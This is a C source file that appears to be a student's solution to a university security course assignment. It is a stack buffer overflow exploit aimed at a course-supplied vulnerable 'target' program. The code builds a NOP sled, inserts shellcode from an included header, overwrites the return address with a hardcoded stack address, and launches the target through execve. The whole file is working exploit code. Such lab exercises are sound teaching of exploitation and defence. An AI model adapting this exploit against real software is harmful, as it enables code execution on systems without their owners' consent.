
/* AUTHOR: Basundhara Dey */
/* NID: ba407257 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/home/ba407257/cap6135-project1-source/cap6135-project1-source/targets/target"

int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;
/* Start of Code by ba407257 */
  int offset = 105;
  char sh_buff[32770]; /* To terminate string adding one extra byte */
/* End of Code by ba407257 */

/* Start of Code by ba407257 */
  memset(sh_buff,'\x90',32769); /* Generating NOP Sled by initializing a block of memory to a specified value */
  memcpy(sh_buff, shellcode, sizeof(shellcode)-1); /* Copying the shell code in the starting of the buffer */
/* End of Code by ba407257 */

/* Start of Code by ba407257 */
  memcpy(sh_buff + offset ,"\x63\x7d\xff\xbf", 4); /* Modify the return address with the offset value */
/* End of Code by ba407257 */

  args[0] = TARGET;
/* Start of Code by ba407257 */
  args[1] = sh_buff;
/* End of Code by ba407257 */
  args[2] = NULL;
  env[0] = "FOO=bar";
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

   return 0;
}
